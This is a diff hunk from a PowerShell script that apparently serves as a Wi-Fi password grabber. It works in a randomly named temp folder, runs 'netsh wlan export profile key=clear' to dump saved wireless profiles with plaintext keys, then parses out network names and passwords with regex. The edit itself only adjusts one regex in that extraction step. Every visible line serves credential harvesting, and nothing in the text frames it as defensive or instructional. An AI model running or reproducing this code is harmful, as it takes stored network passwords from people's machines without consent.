@@ -53,7 +53,7 @@ New-Item -Path $env:temp -Name "js2k3kd4nne5dhsk" -ItemType "directory"
 Set-Location -Path "$env:temp/js2k3kd4nne5dhsk"; netsh wlan export profile key=clear
 $originalOutput = Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} 
 $touchedOutput = $originalOutput.Replace("C:\Users\$env:username\AppData\Local\Temp\js2k3kd4nne5dhsk\", "")
-$loggedwifis = $touchedOutput -replace "\.xml:.*?\:"
+$loggedwifis = $touchedOutput -replace "\.xml.*?\:"
 $wifinames = $loggedwifis | select-string -Pattern '(Wi-Fi-.*:)' | ForEach-Object { $_.Matches.Value }
 $wifipass = $loggedwifis | select-string -Pattern '(:.*)' | ForEach-Object { $_.Matches.Value } 
 $wifipass.Replace(":", "")
